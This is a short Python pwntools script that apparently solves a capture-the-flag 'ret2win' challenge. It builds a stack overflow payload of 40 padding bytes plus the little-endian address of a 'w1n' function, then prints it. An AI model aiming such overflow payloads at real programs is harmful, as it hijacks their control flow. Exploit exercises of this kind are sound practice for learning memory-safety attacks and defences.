from pwn import *

def address_to_bytes(addr):
    return bytes([addr & 0xff, (addr >> 8) & 0xff, (addr >> 16) & 0xff, (addr >> 24) & 0xff, (addr >> 32) & 0xff, (addr >> 40) & 0xff])

w1n_addr = 0x5555555552d4

payload = b"a"*40  + address_to_bytes(w1n_addr)
print(payload)
